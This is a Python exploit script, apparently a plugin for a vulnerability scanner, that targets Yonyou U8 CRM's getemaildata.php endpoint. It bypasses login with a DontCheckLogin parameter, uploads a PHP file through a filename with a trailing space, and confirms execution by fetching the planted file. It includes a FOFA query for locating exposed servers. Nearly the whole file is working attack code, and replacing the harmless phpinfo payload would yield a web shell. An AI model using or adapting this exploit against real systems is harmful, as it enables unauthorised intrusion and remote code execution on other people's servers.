#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '"用友U8CRM"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/4',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ'
      }
  target = '/ajax/getemaildata.php?DontCheckLogin=1'
  data = '''


------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundarykS5RKgl8t3nwInMQ
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if resp.status_code == 200:
      pass
    else:
      return ret
  except:
    return ret
  try:
    res = requests.get(url=url+'/tmpfile/updD24D.tmp.php',timeout=5)
    if res.status_code == 200 and 'phpinfo()' in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret